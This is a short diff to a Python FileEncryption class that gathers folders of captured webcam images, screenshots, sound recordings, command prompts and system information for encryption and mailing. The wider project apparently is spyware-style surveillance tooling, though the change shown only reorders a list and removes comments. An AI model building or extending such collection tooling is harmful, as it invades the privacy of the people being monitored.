@@ -1,13 +1,8 @@
-# Built-in modules
 import os
 import time
 import zipfile
 import shutil
-
-# External libraries
 from cryptography.fernet import Fernet
-
-# Custom modules
 from Util.DataClass import DataClass
 import Util.SendMail as SendMail
 
@@ -32,10 +27,10 @@ class FileEncryption(DataClass):
         # Folders in a list
         self.folders = [
             self.folder_path_cmdprompts,
-            self.folder_path_webcamera,
             self.folder_path_screenshot,
             self.folder_path_soundfile,
-            self.folder_path_systeminformation
+            self.folder_path_systeminformation,
+            self.folder_path_webcamera
         ]
 
         self.base_folder = os.path.dirname(os.path.commonprefix(self.folders))
